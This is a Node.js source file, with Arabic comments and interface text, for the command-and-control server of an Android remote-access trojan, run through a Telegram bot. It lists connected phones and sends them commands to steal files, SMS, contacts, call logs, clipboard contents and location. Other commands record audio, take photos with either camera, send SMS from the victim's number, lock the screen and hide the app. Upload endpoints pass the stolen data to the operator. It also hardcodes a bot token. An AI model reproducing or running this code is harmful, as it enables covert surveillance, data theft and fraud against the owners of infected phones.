const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

// --- الإعدادات ---
// استبدل بالتوكن الخاص بك
const TOKEN = '8281760473:AAEVJgJjuY6uemr_9PEzpjWePTzncdTZdXg'; 
// استبدل بالمعرف الرقمي الخاص بك (Your Telegram User ID)
const ADMIN_ID = 7892474994; 
// قائمة المستخدمين المصرح لهم (يمكنك إضافة المزيد)
const AUTHORIZED_USERS = [ADMIN_ID]; 
// عنوان للتحقق من أن الخادم يعمل (لتجنب نوم الخادم على منصات الاستضافة)
const PING_URL = 'https://www.google.com'; 

// --- تهيئة الخادم ---
const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(TOKEN, { polling: true });
const appClients = new Map();
const userSessions = new Map(); // لتخزين جلسات المستخدمين

const upload = multer();
app.use(bodyParser.json());

// --- دالة مساعدة لإرسال رسالة موحدة ---
function sendProcessingMessage(chatId) {
    appBot.sendMessage(chatId, '⏳ جارِ تنفيذ طلبك...', {
        parse_mode: "HTML",
        reply_markup: {
            keyboard: [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
            resize_keyboard: true
        }
    });
}

// --- مسارات HTTP ---
app.get('/', (req, res) => {
    res.send('<h1 align="center">✅ الخادم يعمل بنجاح</h1>');
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    if (!req.file) return res.status(400).send('No file uploaded.');
    const model = req.headers.model || 'جهاز غير معروف';
    const caption = `📂 ملف جديد من جهاز <b>${model}</b>`;
    appBot.sendDocument(ADMIN_ID, req.file.buffer, { caption, parse_mode: "HTML" }, { filename: req.file.originalname });
    res.send('File uploaded successfully.');
});

app.post("/uploadText", (req, res) => {
    const model = req.headers.model || 'جهاز غير معروف';
    const text = req.body.text || 'لا يوجد نص';
    appBot.sendMessage(ADMIN_ID, `📝 نص من جهاز <b>${model}</b>:\n\n<pre>${text}</pre>`, { parse_mode: "HTML" });
    res.send('Text uploaded successfully.');
});

app.post("/uploadLocation", (req, res) => {
    const { lat, lon } = req.body;
    if (!lat || !lon) return res.status(400).send('Invalid location data.');
    const model = req.headers.model || 'جهاز غير معروف';
    appBot.sendMessage(ADMIN_ID, `📍 موقع من جهاز <b>${model}</b>`, { parse_mode: "HTML" });
    appBot.sendLocation(ADMIN_ID, lat, lon);
    res.send('Location uploaded successfully.');
});

// --- معالجة اتصالات WebSocket ---
appSocket.on('connection', (ws, req) => {
    console.log('New client connecting...');
    const uuid = uuidv4();
    ws.uuid = uuid;

    const clientInfo = {
        model: req.headers.model || 'غير محدد',
        battery: req.headers.battery || 'غير محدد',
        version: req.headers.version || 'غير محدد',
        brightness: req.headers.brightness || 'غير محدد',
        provider: req.headers.provider || 'غير محدد',
        ws: ws // حفظ كائن WebSocket للوصول إليه لاحقًا
    };
    appClients.set(uuid, clientInfo);

    const message = `
✅ <b>جهاز جديد متصل</b>
    
• <b>نوع الجهاز:</b> ${clientInfo.model}
• <b>البطارية:</b> ${clientInfo.battery}%
• <b>إصدار الأندرويد:</b> ${clientInfo.version}
• <b>سطوع الشاشة:</b> ${clientInfo.brightness}%
• <b>الشبكة:</b> ${clientInfo.provider}
    `;
    appBot.sendMessage(ADMIN_ID, message, { parse_mode: "HTML" });

    ws.on('error', (error) => {
        console.error(`WebSocket Error for client ${uuid}:`, error);
    });

    ws.on('close', () => {
        const disconnectedClient = appClients.get(uuid);
        if (disconnectedClient) {
            const disconnectMessage = `
❌ <b>انقطع اتصال جهاز</b>
        
• <b>نوع الجهاز:</b> ${disconnectedClient.model}
            `;
            appBot.sendMessage(ADMIN_ID, disconnectMessage, { parse_mode: "HTML" });
            appClients.delete(uuid);
        }
        console.log(`Client ${uuid} disconnected.`);
    });
});

// --- معالجة رسائل وأوامر بوت التيليجرام ---
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    const text = message.text;

    // التحقق من أن المستخدم مصرح له
    if (!AUTHORIZED_USERS.includes(chatId)) {
        appBot.sendMessage(chatId, '🚫 أنت غير مصرح لك باستخدام هذا البوت.');
        return;
    }

    // التعامل مع الردود على الرسائل
    const userSession = userSessions.get(chatId);
    if (message.reply_to_message && userSession) {
        const client = appClients.get(userSession.uuid);
        if (!client) {
            appBot.sendMessage(chatId, '⚠️ الجهاز المحدد لم يعد متصلاً.');
            userSessions.delete(chatId);
            return;
        }

        try {
            switch (userSession.action) {
                case 'send_message_number':
                    userSession.data = { number: text };
                    userSession.action = 'send_message_text';
                    appBot.sendMessage(chatId, '👍 حسنًا، الآن أدخل نص الرسالة التي تريد إرسالها.', { reply_markup: { force_reply: true } });
                    break;
                case 'send_message_text':
                    client.ws.send(`send_message:${userSession.data.number}/${text}`);
                    sendProcessingMessage(chatId);
                    userSessions.delete(chatId);
                    break;
                // يمكنك إضافة المزيد من الحالات هنا بنفس الطريقة
            }
        } catch (e) {
            console.error("Error processing reply:", e);
            appBot.sendMessage(chatId, "حدث خطأ أثناء معالجة طلبك.");
        }
        return;
    }

    // التعامل مع الأوامر الرئيسية
    switch (text) {
        case '/start':
            appBot.sendMessage(chatId, 'أهلاً بك في لوحة التحكم. اختر أحد الخيارات من القائمة.', {
                reply_markup: {
                    keyboard: [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                    resize_keyboard: true
                }
            });
            break;
        case 'الأجهزة المتصلة':
            if (appClients.size === 0) {
                appBot.sendMessage(chatId, 'لا توجد أجهزة متصلة حاليًا.');
            } else {
                let response = '<b>الأجهزة المتصلة حاليًا:</b>\n\n';
                appClients.forEach((client, uuid) => {
                    response += `📱 <b>${client.model}</b>\n(ID: <code>${uuid.substring(0, 8)}</code>)\n\n`;
                });
                appBot.sendMessage(chatId, response, { parse_mode: "HTML" });
            }
            break;
        case 'تنفيذ أمر':
            if (appClients.size === 0) {
                appBot.sendMessage(chatId, 'لا توجد أجهزة متصلة لتنفيذ الأوامر عليها.');
            } else {
                const deviceListKeyboard = Array.from(appClients.entries()).map(([uuid, client]) => ([{
                    text: client.model,
                    callback_data: `device:${uuid}`
                }]));
                appBot.sendMessage(chatId, 'اختر الجهاز الذي تريد التحكم به:', {
                    reply_markup: { inline_keyboard: deviceListKeyboard }
                });
            }
            break;
    }
});

// --- معالجة الأزرار المضمنة (Callback Queries) ---
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    const [command, uuid] = callbackQuery.data.split(':');

    if (!AUTHORIZED_USERS.includes(chatId)) return;

    const client = appClients.get(uuid);
    if (!client) {
        appBot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ الجهاز لم يعد متصلاً!', show_alert: true });
        return;
    }

    if (command === 'device') {
        const commandsKeyboard = [
            [{ text: '📦 التطبيقات', callback_data: `apps:${uuid}` }, { text: 'ℹ️ معلومات الجهاز', callback_data: `device_info:${uuid}` }],
            [{ text: '📥 سحب ملف', callback_data: `file:${uuid}` }, { text: '🗑️ حذف ملف', callback_data: `delete_file:${uuid}` }],
            [{ text: '📋 الحافظة', callback_data: `clipboard:${uuid}` }, { text: '🎤 تسجيل صوت', callback_data: `microphone:${uuid}` }],
            [{ text: '📸 كاميرا أساسية', callback_data: `camera_main:${uuid}` }, { text: '🤳 كاميرا أمامية', callback_data: `camera_selfie:${uuid}` }],
            [{ text: '📍 الموقع', callback_data: `location:${uuid}` }, { text: '💬 رسالة عائمة', callback_data: `toast:${uuid}` }],
            [{ text: '📞 سجل المكالمات', callback_data: `calls:${uuid}` }, { text: '👥 جهات الاتصال', callback_data: `contacts:${uuid}` }],
            [{ text: '📳 اهتزاز', callback_data: `vibrate:${uuid}` }, { text: '🔔 إظهار إشعار', callback_data: `show_notification:${uuid}` }],
            [{ text: '✉️ الرسائل النصية', callback_data: `messages:${uuid}` }, { text: '📲 إرسال رسالة', callback_data: `send_message:${uuid}` }],
            [{ text: '🎵 تشغيل صوت', callback_data: `play_audio:${uuid}` }, { text: '🔇 إيقاف الصوت', callback_data: `stop_audio:${uuid}` }],
            [{ text: '🔒 قفل الشاشة', callback_data: `lock_device:${uuid}` }, { text: '🚫 إخفاء التطبيق', callback_data: `hide_app:${uuid}` }]
        ];
        appBot.editMessageText(`اختر أمرًا لتنفيذه على جهاز <b>${client.model}</b>:`, {
            chat_id: chatId,
            message_id: msg.message_id,
            reply_markup: { inline_keyboard: commandsKeyboard },
            parse_mode: "HTML"
        });
    } else {
        // الأوامر التي تتطلب إدخالاً من المستخدم
        const commandsWithInput = ['send_message', 'file', 'delete_file', 'microphone', 'toast', 'show_notification', 'play_audio'];
        if (commandsWithInput.includes(command)) {
            userSessions.set(chatId, { uuid: uuid, action: `${command}_number` }); // كمثال
            let promptMessage = '';
            switch (command) {
                case 'send_message':
                    promptMessage = 'الرجاء الرد على هذه الرسالة برقم الهاتف الذي تريد إرسال الرسالة إليه.';
                    break;
                // أضف رسائل للأوامر الأخرى هنا
            }
            appBot.sendMessage(chatId, promptMessage, { reply_markup: { force_reply: true } });
            appBot.deleteMessage(chatId, msg.message_id);
        } else {
            // الأوامر المباشرة
            try {
                client.ws.send(command);
                appBot.answerCallbackQuery(callbackQuery.id, { text: '✅ تم إرسال الأمر بنجاح!' });
                appBot.deleteMessage(chatId, msg.message_id);
                sendProcessingMessage(chatId);
            } catch (e) {
                console.error("Failed to send command:", e);
                appBot.answerCallbackQuery(callbackQuery.id, { text: '❌ فشل إرسال الأمر.', show_alert: true });
            }
        }
    }
});

// --- مهام دورية ---
setInterval(() => {
    appClients.forEach(client => {
        try {
            client.ws.send('ping');
        } catch (e) {
            console.error("Failed to send ping:", e);
        }
    });
    axios.get(PING_URL).catch(() => {});
}, 20000); // كل 20 ثانية

const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
